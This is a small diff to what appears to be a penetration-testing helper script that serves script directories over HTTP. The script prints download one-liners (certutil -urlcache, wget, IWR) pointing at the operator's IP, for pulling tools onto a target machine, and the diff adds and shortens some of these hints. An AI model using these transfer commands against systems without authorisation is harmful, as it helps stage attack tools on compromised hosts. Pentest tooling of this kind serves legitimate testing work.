@@ -67,7 +67,7 @@ EOF
      echo "# certutil -urlcache -split -f http://$ip/"
      echo "# certutil -urlcache -f http://$ip/"
      echo "# wget http://$ip/"
-     echo "# Invoke-WebRequest -Uri \"http://$ip/\""
+     echo "# IWR \"http://$ip/\""
   elif [[ "$1" == "linux" || "$1" == "lin" || "$1" == "l" ]]; then
      echo Serving directory $scripts_linux
      dir="$scripts_linux"
@@ -80,6 +80,7 @@ EOF
      echo Serving current directory \($dir\)
      echo "# wget http://$ip/"
      echo "# certutil -urlcache -split -f http://$ip/"
+     echo "# IWR \"http://$ip/\""
   fi
 
   if [ -n "$2" ]; then
